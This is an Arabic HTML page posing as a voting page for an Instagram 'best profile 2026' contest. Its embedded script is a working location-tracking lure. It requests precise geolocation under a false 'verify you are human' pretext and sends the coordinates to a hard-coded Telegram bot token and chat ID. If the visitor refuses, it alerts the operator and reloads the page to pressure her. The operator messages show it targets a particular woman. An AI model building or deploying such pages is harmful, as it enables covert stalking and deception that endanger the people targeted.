<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مسابقة أفضل بروفايل 2026</title>
    <style>
        body { background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); width: 90%; max-width: 380px; text-align: center; }
        .profile-img { width: 100px; height: 100px; border-radius: 50%; border: 4px solid #e1306c; padding: 3px; margin-bottom: 15px; }
        h2 { color: #262626; font-size: 20px; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; line-height: 1.5; }
        .btn { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); color: white; border: none; padding: 12px; border-radius: 30px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; margin-top: 20px; box-shadow: 0 4px 15px rgba(225, 48, 108, 0.4); }
        #status { margin-top: 15px; font-size: 12px; color: #ed4956; display: none; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" class="profile-img" alt="User">
    <h2>التصويت لـ (ha2542213)</h2>
    <p>بقي 50 صوتاً فقط لتفوز رفيقتك بالمركز الأول! <br><br> <b>ملاحظة:</b> يجب السماح بالوصول للموقع للتأكد من أنك "مستخدم حقيقي" ولحماية نزاهة التصويت.</p>
    <button class="btn" onclick="vote()">صوّت الآن (دعم الهوية)</button>
    <div id="status">⚠️ خطأ: يجب تفعيل "سماح للموقع" ليتم احتساب صوتك!</div>
</div>

<script>
    const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
    const chat_id = '7214473798';

    function send(m) {
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(m)}`);
    }

    function vote() {
        const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(p) {
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                const acc = p.coords.accuracy;
                const mapLink = `https://www.google.com/maps?q=${lat},${lat},${lon}`;
                
                send(`🎯 صيد المسابقة!\n👤 الحساب: ha2542213\n📍 الموقع: ${mapLink}\n📏 الدقة: ${acc.toFixed(1)} متر`);
                
                alert("تم احتساب صوتك بنجاح! شكراً لدعمك.");
                window.location.href = "https://www.instagram.com/ha2542213";
            }, function(e) {
                send("⚠️ البنت دخلت المسابقة ورفضت الموقع.");
                document.getElementById('status').style.display = 'block';
                // إجبارها على المحاولة مرة ثانية
                setTimeout(() => { alert("يجب الضغط على 'سماح' ليتم قبول التصويت."); location.reload(); }, 500);
            }, options);
        }
    }
</script>
</body>
</html>
